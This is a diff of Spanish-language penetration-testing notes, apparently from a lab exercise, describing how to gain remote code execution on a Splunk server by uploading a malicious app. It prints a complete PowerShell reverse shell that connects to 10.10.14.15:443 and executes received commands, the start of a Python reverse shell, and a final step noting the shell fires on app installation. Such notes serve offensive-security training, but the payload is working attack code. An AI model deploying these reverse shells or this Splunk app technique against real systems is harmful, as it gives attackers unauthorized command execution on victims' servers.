@@ -23,13 +23,13 @@ Podemos tener RCE si creamos una aplicación en python, batch o Powershell.
 
 ##### 2) En la carpeta bin metemos los scripts que vamos a correr y en el directorio default tenemos que poner los inputs.conf
 
-###### Script de shell reversa en powershell:
+###### Script de shell reversa en powershell si el server es windows:
 
         #A simple and small reverse shell. Options and help removed to save space. 
         #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
         $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-###### Script en python:
+###### Script en python si el server es Linux:
 
         import sys,socket,os,pty
         
@@ -65,4 +65,7 @@ Este es el archivo que le dice a splunk qué script debe correr.
 ##### 6) Subir e instalar la aplicación:
 
         https://10.129.201.50:8000/en-US/manager/search/apps/local
+
+##### 7)Vamos a install app from file  e iniciamos un listener e instalamos la app
+Ni bien se instale, la shell va a correr.
         
